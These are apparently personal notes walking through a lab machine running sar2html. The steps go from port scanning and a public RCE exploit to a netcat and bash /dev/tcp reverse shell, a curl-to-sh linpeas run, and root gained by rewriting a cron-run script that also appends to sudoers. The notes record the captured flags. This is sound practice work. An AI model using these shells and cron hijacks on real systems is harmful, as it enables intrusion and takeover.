Given IP 192.168.172.35
Netdiscover under normal non given circumstances

rustscan 192.168.52.35 
	22/tcp open  ssh     syn-ack
	80/tcp open  http    syn-ack

nmap -sC -sV -p22,80  192.168.172.35 -oN sar.nmap -v
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
	|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
	|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	| http-methods: 
	|_  Supported Methods: POST OPTIONS HEAD GET
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

dirb http://192.168.172.35

robots.txt
	sar2html
		![[Pasted image 20231104112744.png]]

searchsploit
	searchsploit sar2html                                  
		 Exploit Title                                 |  Path
		----------------------------------------------- ---------------------------------
		sar2html 3.2.1 - 'plot' Remote Code Execution  | php/webapps/49344.py
	cp /usr/share/exploitdb/exploits/php/webapps/49344.py . 

# Weaponization

Check out the exploit
	head -n 30 49344.py
	python3 49344.py -h
		http://192.168.172.35/sar2HTML

It's interactive
![[Pasted image 20231104113225.png]]


Shoot back a normal nc rev shell

nc -nlvp 4444 

nc rev shell from target
	https://www.revshells.com/
	 →  hostname -I                                                         09:34:52
		192.168.0.101 192.168.0.105 172.17.0.1 **192.168.45.172** 
	nc 192.168.45.172 4444 -e sh

Upload a rev shell where there is a report upload option

![[Pasted image 20231104115019.png]]

local flag
b31e01a5ec4805151bc37e35b37afb71

upgrade shell 
	python3 -c 'import pty; pty.spawn("/bin/bash")'

# Priv Esc

Run linpeas.sh
	`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`


See entry for crontab

go check system crontab and I see root has a file running

modify the script that runs and we should get root

![[Pasted image 20231104115706.png]]

![[Pasted image 20231104121501.png]]

will replace the wrtie.sh with adding myself to sudoers group
	cat > write.sh
		echo "www-data ALL= (root) NOPASSWD: /usr/bin/sudo " >>/etc/sudoers
	Now check `sudo -l` after 5 minutes for perms
		Didn't work so doing a rev shell

```bash
#!/bin/bash
sh -i >& /dev/tcp/192.168.45.172/4445 0>&1
```

wrote to revshell2.sh

prep nc
	nc -nlvp 4445

python -m http.server 80


Uploaded file to target then changed name to write.sh

chmod +x write.sh

wait 5 minutes for a rev shell connection with root privledges

GOT EM

![[Pasted image 20231104121530.png]]

40c99df0259b92f7f5112f2d5dfef36b